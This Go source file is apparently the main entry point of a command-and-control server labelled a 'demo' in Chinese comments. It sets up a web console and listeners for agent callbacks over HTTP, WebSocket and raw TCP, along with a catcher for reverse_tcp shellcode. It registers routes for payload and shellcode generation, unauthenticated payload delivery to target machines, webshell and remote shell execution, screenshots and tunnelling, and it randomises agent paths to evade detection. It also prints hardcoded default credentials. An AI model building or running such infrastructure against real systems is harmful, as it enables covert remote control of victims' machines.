package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// ============ C2 服务端主入口（Go 版，替代 Flask app.py）============

func main() {
	// 确定目录
	exePath, _ := os.Executable()
	serverDir = filepath.Dir(exePath)
	// 如果是 go run，exePath 可能在临时目录，回退到工作目录
	if !fileExists(filepath.Join(serverDir, "static")) {
		if wd, err := os.Getwd(); err == nil {
			if fileExists(filepath.Join(wd, "static")) {
				serverDir = wd
			} else if fileExists(filepath.Join(wd, "server-go", "static")) {
				serverDir = filepath.Join(wd, "server-go")
			}
		}
	}
	projectRoot = filepath.Dir(serverDir)

	// 确保必要目录存在
	ensureDirs()

	// 初始化数据库
	dbPath := filepath.Join(serverDir, "c2.db")
	if err := initDB(dbPath); err != nil {
		log.Fatalf("数据库初始化失败: %v", err)
	}

	// 写入默认配置
	ensureDefaultSettings()

	// 加载 config.json（web ip/port/protocol 等文件配置）
	if cfg, err := loadFileConfig(); err != nil {
		log.Printf("[WARN] config.json 加载失败: %v（使用默认值）", err)
	} else {
		log.Printf("[OK] config.json 已加载: web=%s:%d (%s)", cfg.Web.Host, cfg.Web.Port, strings.ToUpper(cfg.Web.Protocol))
	}

	// 加载加密配置
	encAlgo, encPwd := loadEncryptionConfig()

	// 启动离线检测
	startOfflineChecker()

	// 注册路由（Web 控制台 + Agent 回连 完全分离）
	webMux := registerWebMux()
	agentMux := registerAgentMux()

	// 获取监听配置
	listenHost := getListenHost()
	listenPort := getListenPort()       // Web 控制台端口（config.json, 默认 5000）
	listenProto := getListenProtocol()  // Web 控制台协议（http/https）
	clientPort := getClientListenPort() // Agent 回连端口（默认 8443）
	agentProto := getAgentProtocol()    // Agent 回连协议（独立配置，默认 http）

	// 启动 Shell TCP Handler（独立端口，接受 reverse_tcp shellcode 回连）
	// 与 web/agent 的 HTTP 端口完全分离，raw TCP 流量
	startShellListener(getShellListenPort())

	// 启动 Agent TCP 监听（独立端口，TCP 协议 Agent 回连，与 HTTP/WS 共用加密通信协议）
	startAgentTCPListener(getAgentTCPPort())

	// 显示启动信息
	fmt.Println(strings.Repeat("=", 50))
	fmt.Println("C2 演示系统启动成功！ (Go 版)")
	fmt.Printf("Web 控制台:   %s://%s:%s （管理后台）\n", listenProto, getEffectiveHost(), listenPort)
	fmt.Printf("Agent 回连:   %s://%s:%s （agent/deliver）\n", agentProto, getEffectiveHost(), clientPort)
	fmt.Printf("Agent WS:     ws://%s:%s/ws/agent/ （WebSocket 回连，与 HTTP 共用端口）\n", getEffectiveHost(), clientPort)
	fmt.Printf("Agent TCP:    tcp://%s:%s （TCP 协议 Agent 回连）\n", getEffectiveHost(), getAgentTCPPort())
	fmt.Printf("Shell TCP:    tcp://%s:%s （reverse_tcp 回连）\n", getEffectiveHost(), getShellListenPort())
	if encAlgo != "none" {
		fmt.Printf("通信加密: %s\n", strings.ToUpper(encAlgo))
	} else {
		fmt.Println("通信加密: 未启用（明文）")
	}
	fmt.Printf("内网穿透端口: 转发=%s / SOCKS5=%s / HTTP=%s\n",
		getTunnelPort("forward"), getTunnelPort("socks5"), getTunnelPort("http"))
	fmt.Printf("WebSocket 连接: /ws (Web 控制台端口)\n")
	fmt.Printf("Go Agent: %s/client-go/c2_agent.exe\n", projectRoot)
	fmt.Println("默认账号: admin / admin123")
	fmt.Printf("加密密码: %s\n", encPwd)
	fmt.Println(strings.Repeat("=", 50))

	// 用安全中间件包装 Web 控制台（Origin 验证 + CSP 安全头）
	webHandler := securityMiddleware(webMux)

	// ============ Web 控制台监听（管理后台，端口 5000）============
	// 只服务: 静态文件 / WebSocket / /api/* 管理接口
	// 不暴露: /agent/* /deliver/*（在 agentMux 上）
	go func() {
		webAddr := listenHost + ":" + listenPort
		if listenProto == "https" {
			cert, key := getSSLCert(), getSSLKey()
			if cert != "" && key != "" {
				log.Printf("[Web 控制台] HTTPS 监听于 %s", webAddr)
				if err := http.ListenAndServeTLS(webAddr, cert, key, webHandler); err != nil {
					log.Fatalf("[Web 控制台] 启动失败: %v", err)
				}
				return
			}
			log.Printf("[Web 控制台] SSL 证书未配置，回退到 HTTP")
		}
		log.Printf("[Web 控制台] HTTP 监听于 %s", webAddr)
		if err := http.ListenAndServe(webAddr, webHandler); err != nil {
			log.Fatalf("[Web 控制台] 启动失败: %v", err)
		}
	}()

	// ============ Agent 回连监听（agent/目标机器专用，端口 8443）============
	// 只服务: /agent/* 通信端点 + /deliver/* 投递 URL
	// 不暴露: /api/* 管理接口 / 静态文件（web 管理后台完全不暴露给 agent）
	// 协议独立于 web 控制台（agent_proto），SSL 证书共用 web 的配置
	go func() {
		agentAddr := listenHost + ":" + clientPort
		if agentProto == "https" {
			cert, key := getSSLCert(), getSSLKey()
			if cert != "" && key != "" {
				log.Printf("[Agent 回连] HTTPS 监听于 %s", agentAddr)
				if err := http.ListenAndServeTLS(agentAddr, cert, key, agentMux); err != nil {
					log.Printf("[WARN] [Agent 回连] 端口 %s 启动失败: %v", agentAddr, err)
				}
				return
			}
			log.Printf("[Agent 回连] SSL 证书未配置，回退到 HTTP")
		}
		log.Printf("[Agent 回连] HTTP 监听于 %s", agentAddr)
		if err := http.ListenAndServe(agentAddr, agentMux); err != nil {
			log.Printf("[WARN] [Agent 回连] 端口 %s 启动失败: %v", agentAddr, err)
		}
	}()

	// 主线程阻塞（Shell TCP Handler 已在 startShellListener 里启动 goroutine）
	select {}
}

// registerWebMux 注册 Web 控制台路由（管理后台专用，端口 5000）
// 只服务: 静态文件 / WebSocket / /api/* 管理接口
// 不暴露: /agent/* /deliver/*（这些在 agentMux 上）
func registerWebMux() *http.ServeMux {
	mux := http.NewServeMux()

	// ============ 静态文件服务 ============
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/" {
			http.ServeFile(w, r, filepath.Join(serverDir, "static", "index.html"))
			return
		}
		// agent/deliver 路径在 agentMux 上，web 控制台不暴露
		if strings.HasPrefix(r.URL.Path, "/agent/") || strings.HasPrefix(r.URL.Path, "/deliver/") {
			http.NotFound(w, r)
			return
		}
		filePath := filepath.Join(serverDir, "static", r.URL.Path)
		if fileExists(filePath) {
			http.ServeFile(w, r, filePath)
		} else {
			// SPA 回退到 index.html（非 /api/ 路径）
			if !strings.HasPrefix(r.URL.Path, "/api/") {
				http.ServeFile(w, r, filepath.Join(serverDir, "static", "index.html"))
				return
			}
			http.NotFound(w, r)
		}
	})

	// ============ WebSocket ============
	mux.HandleFunc("/ws", handleWebSocket)

	// ============ 认证 API ============
	mux.HandleFunc("/api/login", handleLogin)

	// ============ 仪表盘 ============
	mux.HandleFunc("/api/dashboard/stats", requireAuth(handleDashboardStats))

	// ============ 客户端管理 ============
	mux.HandleFunc("/api/clients", requireAuth(handleListClients))
	mux.HandleFunc("/api/clients/", func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path
		if strings.HasSuffix(path, "/delete") && r.Method == "POST" {
			clientID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/clients/"), "/delete")
			r.SetPathValue("client_id", clientID)
			requireAuth(handleDeleteClient)(w, r)
			return
		}
		clientID := strings.TrimPrefix(path, "/api/clients/")
		r.SetPathValue("client_id", clientID)
		requireAuth(handleGetClient)(w, r)
	})

	// ============ Session 管理 ============
	mux.HandleFunc("/api/sessions", requireAuth(handleListSessions))
	mux.HandleFunc("/api/sessions/batch_kill", requireAuth(handleBatchKillSessions))
	mux.HandleFunc("/api/sessions/", func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path
		if strings.HasSuffix(path, "/kill") && r.Method == "POST" {
			sessionID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/sessions/"), "/kill")
			r.SetPathValue("session_id", sessionID)
			requireAuth(handleKillSession)(w, r)
			return
		}
		if strings.HasSuffix(path, "/interact") && r.Method == "POST" {
			sessionID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/sessions/"), "/interact")
			r.SetPathValue("session_id", sessionID)
			requireAuth(handleInteractSession)(w, r)
			return
		}
		http.NotFound(w, r)
	})

	// ============ 分组 ============
	mux.HandleFunc("/api/groups", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			requireAuth(handleCreateGroup)(w, r)
			return
		}
		requireAuth(handleListGroups)(w, r)
	})
	mux.HandleFunc("/api/clients/group", requireAuth(handleSetClientGroup))

	// ============ 任务管理 ============
	mux.HandleFunc("/api/task/send", requireAuth(handleSendTask))
	mux.HandleFunc("/api/tasks", requireAuth(handleListTasks))
	mux.HandleFunc("/api/task/", func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path
		if strings.HasSuffix(path, "/delete") && r.Method == "POST" {
			taskID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/task/"), "/delete")
			r.SetPathValue("task_id", taskID)
			requireAuth(handleDeleteTask)(w, r)
			return
		}
		taskID := strings.TrimPrefix(path, "/api/task/")
		if _, err := strconv.Atoi(taskID); err != nil {
			http.NotFound(w, r)
			return
		}
		r.SetPathValue("task_id", taskID)
		requireAuth(handleGetTask)(w, r)
	})

	// ============ 日志 ============
	mux.HandleFunc("/api/logs", requireAuth(handleListLogs))
	mux.HandleFunc("/api/logs/export", requireAuth(handleExportLogs))
	mux.HandleFunc("/api/logs/clear", requireAuth(handleClearLogs))
	mux.HandleFunc("/api/media/clear", requireAuth(handleClearMedia))

	// ============ 配置管理 ============
	mux.HandleFunc("/api/settings", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "PUT" {
			requireAuth(handleUpdateSettings)(w, r)
			return
		}
		requireAuth(handleGetSettings)(w, r)
	})
	mux.HandleFunc("/api/settings/test", requireAuth(handleSettingsTest))
	mux.HandleFunc("/api/settings/reload_config", requireAuth(handleReloadConfig))
	mux.HandleFunc("/api/user/password", requireAuth(handleChangePassword))

	// ============ 用户管理 ============
	mux.HandleFunc("/api/users", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			requireAuth(handleCreateUser)(w, r)
			return
		}
		requireAuth(handleListUsers)(w, r)
	})
	mux.HandleFunc("/api/users/", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "DELETE" {
			uid := strings.TrimPrefix(r.URL.Path, "/api/users/")
			r.SetPathValue("uid", uid)
			requireAuth(handleDeleteUser)(w, r)
			return
		}
		http.NotFound(w, r)
	})

	// ============ Webhook ============
	mux.HandleFunc("/api/settings/webhook", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			requireAuth(handleSetWebhook)(w, r)
			return
		}
		requireAuth(handleGetWebhook)(w, r)
	})
	mux.HandleFunc("/api/settings/webhook/test", requireAuth(handleTestWebhook))

	// ============ Payload 管理 ============
	mux.HandleFunc("/api/payloads", requireAuth(handleListPayloads))
	mux.HandleFunc("/api/payloads/clear", requireAuth(handleClearPayloads))
	mux.HandleFunc("/api/payloads/", func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, "/delete") && r.Method == "POST" {
			pid := strings.TrimSuffix(strings.TrimPrefix(r.URL.Path, "/api/payloads/"), "/delete")
			r.SetPathValue("pid", pid)
			requireAuth(handleDeletePayload)(w, r)
			return
		}
		http.NotFound(w, r)
	})
	mux.HandleFunc("/api/payload/generate", requireAuth(handleGeneratePayload))
	mux.HandleFunc("/api/payload/shellcode/generate", requireAuth(handleGenerateShellcode))
	mux.HandleFunc("/api/payload/icon/upload", requireAuth(handlePayloadIconUpload))
	mux.HandleFunc("/api/payload/download/", requireAuth(handlePayloadDownload))
	mux.HandleFunc("/api/cmdgen/templates", requireAuth(handleCommandTemplates))

	// ============ 资源文件 ============
	mux.HandleFunc("/api/resource/", requireAuth(handleResource))

	// ============ 文件上传 ============
	mux.HandleFunc("/api/file/upload", requireAuth(handleFileUpload))
	mux.HandleFunc("/api/files/upload", requireAuth(handleFileUpload))

	// ============ 截图 ============
	mux.HandleFunc("/api/screenshot/", func(w http.ResponseWriter, r *http.Request) {
		clientID := strings.TrimPrefix(r.URL.Path, "/api/screenshot/")
		r.SetPathValue("client_id", clientID)
		requireAuth(handleScreenshot)(w, r)
	})

	// ============ WebShell 管理（管理接口，前端调用）============
	mux.HandleFunc("/api/webshell/add", requireAuth(handleWebshellAdd))
	mux.HandleFunc("/api/webshell/list", requireAuth(handleWebshellList))
	mux.HandleFunc("/api/webshell/", func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path
		if strings.HasSuffix(path, "/edit") && r.Method == "POST" {
			clientID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/webshell/"), "/edit")
			r.SetPathValue("client_id", clientID)
			requireAuth(handleWebshellEdit)(w, r)
			return
		}
		if strings.HasSuffix(path, "/exec") && r.Method == "POST" {
			clientID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/webshell/"), "/exec")
			r.SetPathValue("client_id", clientID)
			requireAuth(handleWebshellExec)(w, r)
			return
		}
		http.NotFound(w, r)
	})

	// ============ Shell 会话管理（管理接口，前端调用）============
	mux.HandleFunc("/api/shell/", func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path
		if strings.HasSuffix(path, "/exec") && r.Method == "POST" {
			clientID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/shell/"), "/exec")
			r.SetPathValue("client_id", clientID)
			requireAuth(handleShellExec)(w, r)
			return
		}
		if strings.HasSuffix(path, "/input") && r.Method == "POST" {
			clientID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/shell/"), "/input")
			r.SetPathValue("client_id", clientID)
			requireAuth(handleShellInput)(w, r)
			return
		}
		if strings.HasSuffix(path, "/kill") && r.Method == "POST" {
			clientID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/shell/"), "/kill")
			r.SetPathValue("client_id", clientID)
			requireAuth(handleShellKill)(w, r)
			return
		}
		http.NotFound(w, r)
	})

	return mux
}

// registerAgentMux 注册 Agent 回连路由（agent/目标机器专用，端口 8443）
// 只服务: /agent/* 通信端点 + /deliver/* 投递 URL
// 不暴露: /api/* 管理接口 / /static/* 静态文件（web 管理后台完全不暴露给 agent）
func registerAgentMux() *http.ServeMux {
	mux := http.NewServeMux()

	// ============ Agent 通信端点（加密通信，无需 HTTP 认证）============
	// 路径随机化: 通配符路由 /api/v1/* 接受任意随机后缀，动作类型隐入 body 信封 _op 字段
	// 客户端每次请求路径如 /api/v1/abc123def4567890，服务端忽略后缀，从 body 取 _op 分发
	// 兼容旧路径 /agent/heartbeat 等（向后兼容旧客户端）
	mux.HandleFunc("/api/v1/", handleAgentDispatch)
	// 旧路径兼容（避免已部署客户端断线）
	mux.HandleFunc("/agent/heartbeat", handleAgentHeartbeat)
	mux.HandleFunc("/agent/pull", handleAgentPull)
	mux.HandleFunc("/agent/result", handleAgentResult)
	mux.HandleFunc("/agent/upload", func(w http.ResponseWriter, r *http.Request) {
		jsonOK(w, map[string]interface{}{"status": "ok"})
	})

	// ============ WebSocket Agent 回连端点（与 HTTP 共用端口）============
	// 通配符路径 /ws/agent/<随机hex>，消息内容为纯 base64 密文文本帧
	// 传输层为 WebSocket，应用层协议与 HTTP 一致（_op 隐入加密 payload）
	mux.HandleFunc("/ws/agent/", handleAgentWebSocket)

	// ============ 投递 URL（无需认证，目标机器下载 payload）============
	mux.HandleFunc("/deliver/", handleDeliver)

	return mux
}
